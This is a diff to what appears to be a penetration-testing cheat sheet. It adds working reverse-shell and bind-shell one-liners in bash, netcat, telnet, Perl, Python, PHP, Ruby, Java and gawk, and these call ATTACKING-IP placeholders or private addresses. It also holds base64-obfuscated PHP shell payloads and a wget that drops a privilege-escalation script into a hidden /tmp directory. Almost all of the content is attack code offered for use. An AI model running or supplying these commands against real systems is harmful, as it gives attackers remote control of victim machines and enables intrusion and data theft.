@@ -6,6 +6,19 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 /netcat -e /bin/sh 192.168.16.177 443
 
 # If netcat doesn't have "-e" option use alternatives on victim machine:
+Bash reverse shells:
+
+exec /bin/bash 0&0 2>&0
+
+0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
+
+exec 5<>/dev/tcp/ATTACKING-IP/80
+cat <&5 | while read line; do $line 2>&5 >&5; done
+
+# or:
+
+while read line 0<&5; do $line 2>&5 >&5; done
+
 mknod /tmp/backpipe p 
 /bin/sh 0</tmp/backpipe | nc pentestbox 443 1>/tmp/backpipe
 
@@ -14,19 +27,76 @@ mknod /tmp/backpipe p
 mkfifo pipe
 nc -l 4000 <pipe | bash >pipe
 
+rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 
 /bin/bash -i >& /dev/tcp/192.168.16.177/16000 0>&1
 
 rm/tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.15.227 4444 >/tmp/g
 
+# Perl:
+
 /usr/bin/perl -e 'use Socket;$i="192.168.16.177";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# Perl on Windows:
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# Python:
 
 /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.16.177",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 wget -O /tmp/.X11-unix/linuxprivchecker.py https://raw.githubusercontent.com/pand0rausa/Reverse-Shells/master/linuxprivchecker.py
 
 
-PHP
+# PHP:
 $p="cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTkyLjE2OC4xNi4xNzciOyRwPTQ0NDQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jw==";$d=base64_decode($p);system($d)
 
 $p="L3Vzci9iaW4vcGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xNjguMTYuMTc3Iiw0NDMpO2V4ZWMoIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIik7Jw==";$d=base64_decode($p);system($d)
+
+php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
+
+
+# Telnet:
+rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
+
+telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
+
+
+
+# Ruby:
+ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+
+# Java:
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+
+# Gawk
+
+#!/usr/bin/gawk -f
+
+BEGIN {
+        Port    =       8080
+        Prompt  =       "bkd> "
+
+        Service = "/inet/tcp/" Port "/0/0"
+        while (1) {
+                do {
+                        printf Prompt |& Service
+                        Service |& getline cmd
+                        if (cmd) {
+                                while ((cmd |& getline) > 0)
+                                        print $0 |& Service
+                                close(cmd)
+                        }
+                } while (cmd != "exit")
+                close(Service)
+        }
+}
+
+
